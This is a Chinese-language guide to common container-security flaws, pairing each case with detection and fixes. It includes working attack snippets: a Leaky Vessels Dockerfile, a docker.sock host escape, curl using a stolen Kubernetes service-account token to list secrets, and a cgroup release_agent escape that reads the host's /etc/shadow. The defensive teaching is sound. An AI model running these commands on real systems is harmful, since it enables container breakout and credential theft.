# 容器安全常见漏洞案例

## 案例 1: Leaky Vessels (CVE-2024-21626)

**漏洞类型**: 容器逃逸
**影响**: runc 1.1.11 以下版本
**原理**: 通过 `WORKDIR` 指令利用 `/proc/self/fd` 逃逸到宿主机文件系统

```dockerfile
# 恶意 Dockerfile
FROM ubuntu
WORKDIR /proc/self/fd/8/../../../
RUN cat /etc/shadow  # 读取宿主机文件
```

**检测**: 检查 Dockerfile 中 WORKDIR 是否包含 `/proc` 路径
**修复**: 升级 runc >= 1.1.12

---

## 案例 2: Docker Socket 导致容器逃逸

**场景**: CI/CD runner 容器挂载了 docker.sock

```yaml
# 常见于 GitLab Runner / Jenkins Agent
volumes:
  - /var/run/docker.sock:/var/run/docker.sock
```

**攻击链**:
1. 攻击者获得容器内 shell
2. 通过 docker.sock 创建特权容器
3. 挂载宿主机根目录
4. 获得宿主机 root

```bash
# 容器内执行
docker run -v /:/host --privileged -it alpine chroot /host
```

**缓解**: 使用 Docker-in-Docker（dind）或 Kaniko 构建；如必须挂载，使用 Docker API proxy 限制操作

---

## 案例 3: 多阶段构建密钥泄露

**场景**: 开发者以为 multi-stage 会隔离 secrets

```dockerfile
FROM node:18 AS builder
ARG NPM_TOKEN=npm_xxxxx
RUN echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > .npmrc
RUN npm ci
RUN rm .npmrc  # 以为删了就安全

FROM node:18-slim
COPY --from=builder /app .
# NPM_TOKEN 仍然在 builder stage 的 image 层中
# docker history / dive 工具可提取
```

**修复**: 使用 BuildKit `--mount=type=secret`

---

## 案例 4: K8s RBAC 提权 — ServiceAccount Token

**场景**: Pod 自动挂载了 default SA token

```yaml
# 默认行为
spec:
  serviceAccountName: default
  # automountServiceAccountToken: true (默认)
```

**攻击链**:
1. 攻击者获得 Pod 内 shell
2. 读取 `/var/run/secrets/kubernetes.io/serviceaccount/token`
3. 用 token 调用 K8s API
4. 如果 SA 权限过大，可枚举/修改集群资源

```bash
# Pod 内执行
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

**修复**: `automountServiceAccountToken: false` + 最小 RBAC

---

## 案例 5: .env 文件泄露到 Image

**场景**: .dockerignore 缺失或不完整

```
# 项目结构
├── .env           # DB_PASSWORD=xxx, API_KEY=yyy
├── Dockerfile
├── app.py
└── (无 .dockerignore)
```

```dockerfile
FROM python:3.11
COPY . /app        # .env 被复制进去了！
```

**影响**: 任何能 pull image 的人都能看到 secrets
**检测**: 检查 .dockerignore 是否存在且包含 `.env`
**修复**: 添加 .dockerignore

---

## 案例 6: 资源耗尽 — 容器无限制

**场景**: 无 memory limit 的容器 OOM 影响宿主机

```yaml
# 无资源限制
services:
  app:
    image: myapp
    # 无 deploy.resources.limits
```

**攻击链**:
1. 应用存在内存泄漏或恶意请求导致大量内存分配
2. 容器无限制使用宿主机内存
3. 触发 Linux OOM Killer
4. 可能杀死宿主机上的其他关键进程

**修复**: 所有容器必须设 memory limit

---

## 案例 7: privileged 容器 + cgroup 逃逸

```yaml
# 常见于"图省事"的开发配置
services:
  app:
    privileged: true
```

**攻击链**:
```bash
# 容器内执行 cgroup 逃逸
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
echo $$ > /tmp/cgrp/cgroup.procs
# 宿主机 /etc/shadow 泄露
```

**修复**: 永远不用 `privileged: true`

---

## 案例 8: Alpine apk 中间人攻击

**场景**: Dockerfile 中未使用 HTTPS 的 apk 源

```dockerfile
# ❌ 旧版 Alpine 默认 HTTP 源
FROM alpine:3.12
RUN apk add --no-cache curl
# http://dl-cdn.alpinelinux.org/... 可被 MITM

# ✅ 安全: 新版 Alpine (3.14+) 默认 HTTPS
FROM alpine:3.19
RUN apk add --no-cache curl
```

**检测**: 检查 Alpine 版本 < 3.14 且无自定义 HTTPS 源
